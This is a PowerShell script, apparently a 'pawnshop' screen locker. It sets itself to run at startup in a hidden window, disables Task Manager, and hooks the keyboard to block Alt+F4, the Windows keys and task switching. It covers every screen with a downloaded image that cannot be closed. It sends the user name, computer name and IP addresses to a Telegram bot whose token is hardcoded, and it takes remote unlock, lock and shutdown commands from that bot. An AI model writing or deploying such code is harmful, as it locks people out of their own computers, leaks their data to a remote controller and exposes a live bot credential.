
# CONFIG
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"
$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatID = "656189986"
$pc = $env:COMPUTERNAME
$user = $env:USERNAME
$unlockCommand = "/unlock$user"
$lockCommand = "/lock$user"
$shutdownCommand = "/shutdown$user"
$lockFile = "$env:APPDATA\pawnshop_lock_status.txt"
$RunKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$RunValueName = "PawnShopLock"

# Create lock file if missing
if (-not (Test-Path $lockFile)) { "locked" | Out-File $lockFile -Force }

# Read lock status
$state = Get-Content -Path $lockFile -ErrorAction SilentlyContinue
if ($state -eq "unlocked") {
    Remove-ItemProperty -Path $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
    return
}

# Save script to startup (only if from file)
if ($MyInvocation.MyCommand.Path) {
    $startCmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
    Set-ItemProperty -Path $RunKey -Name $RunValueName -Value $startCmd -Type String -Force
}

# Disable Task Manager
New-Item -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Type DWord -Force

# Load assemblies
Add-Type -AssemblyName System.Windows.Forms,System.Drawing

# Hook keyboard to block ALT+F4 and more
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KeyBlocker {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;
    private static IntPtr hookId = IntPtr.Zero;
    private static LowLevelKeyboardProc proc = HookCallback;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string lpModuleName);
    public static void Block() {
        hookId = SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(null), 0);
    }
    public static void Unblock() {
        if (hookId != IntPtr.Zero) UnhookWindowsHookEx(hookId);
    }
    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) {
            int vkCode = Marshal.ReadInt32(lParam);
            bool alt = (Control.ModifierKeys & Keys.Alt) == Keys.Alt;
            bool ctrl = (Control.ModifierKeys & Keys.Control) == Keys.Control;
            if ((vkCode == 0x73 && alt) || vkCode == 0x5B || vkCode == 0x5C || (vkCode == 0x09 && alt) || (vkCode == 0x09 && ctrl)) return (IntPtr)1;
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
}
"@

[KeyBlocker]::Block()

# Download image
Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing

# Show image fullscreen
$forms = foreach ($screen in [Windows.Forms.Screen]::AllScreens) {
    $form = New-Object Windows.Forms.Form -Property @{
        FormBorderStyle='None'; WindowState='Maximized'; TopMost=$true; Bounds=$screen.Bounds
        ShowInTaskbar=$false; Cursor=[Windows.Forms.Cursors]::None
    }
    $pb = New-Object Windows.Forms.PictureBox -Property @{
        Image=[Drawing.Image]::FromFile($tempImagePath); Dock='Fill'; SizeMode='StretchImage'
    }
    $form.Add_FormClosing({ if (-not $script:AllowClose) { $_.Cancel = $true } })
    $form.Controls.Add($pb)
    $form.Show()
    $form
}

# Send Telegram message
try {
    $ipLocal = (Get-NetIPAddress | ?{$_.AddressFamily -eq "IPv4" -and $_.IPAddress -notmatch '^169|^127'} | Select -First 1 -Expand IPAddress)
} catch { $ipLocal = "n/a" }
try { $ipPublic = Invoke-RestMethod "https://api.ipify.org" } catch { $ipPublic = "n/a" }
$msg = "PC-ul $user ($pc) a fost blocat.`nIP: $ipLocal | $ipPublic`n`n/unlock$user`n/shutdown$user`n/lock$user`n/unlock$pc`n/shutdown$pc`n/lock$pc"
$body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'

# Telegram poller
$script:AllowClose = $false
$offset = 0
try {
    $latest = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?limit=1"
    if ($latest.result) { $offset = $latest.result[0].update_id + 1 }
} catch {}

$timer = New-Object Windows.Forms.Timer
$timer.Interval = 4000
$timer.Add_Tick({
    try {
        $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
        foreach ($u in $updates.result) {
            $offset = $u.update_id + 1
            $text = $u.message.text.ToLower().Trim()
            if ($text -eq "/unlock$user" -or $text -eq "/unlock$pc") {
                "unlocked" | Out-File $lockFile -Force
                Remove-ItemProperty $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
                Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 0 -Force
                $script:AllowClose = $true
                [Windows.Forms.Application]::Exit()
            }
            elseif ($text -eq "/shutdown$user" -or $text -eq "/shutdown$pc") {
                Remove-ItemProperty $RunKey -Name $RunValueName -ErrorAction SilentlyContinue
                Stop-Computer -Force
            }
            elseif ($text -eq "/lock$user" -or $text -eq "/lock$pc") {
                "locked" | Out-File $lockFile -Force
                Set-ItemProperty $RunKey -Name $RunValueName -Value $startCmd -Type String -Force
            }
        }
    } catch {}
})
$timer.Start()

# Start app loop
[Windows.Forms.Application]::Run()

# Cleanup
$timer.Stop()
[KeyBlocker]::Unblock()
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 0 -Force
